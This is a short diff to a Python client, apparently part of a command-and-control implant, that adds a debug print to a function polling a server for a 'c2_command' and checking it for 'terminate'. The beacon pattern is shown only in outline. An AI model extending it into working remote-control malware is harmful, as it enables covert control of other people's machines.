@@ -26,6 +26,7 @@ def check_for_updates():
 def communicate_with_server():
     try:
         req = requests.get(SERVER_URL, timeout=5)
+        print(f'[Client] Successfully connected to server: {SERVER_URL}')  # Added debug
         c2_command = req.text
         print(f'[Client] Received command: {c2_command}')  # For debugging purposes
         if 'terminate' in c2_command:
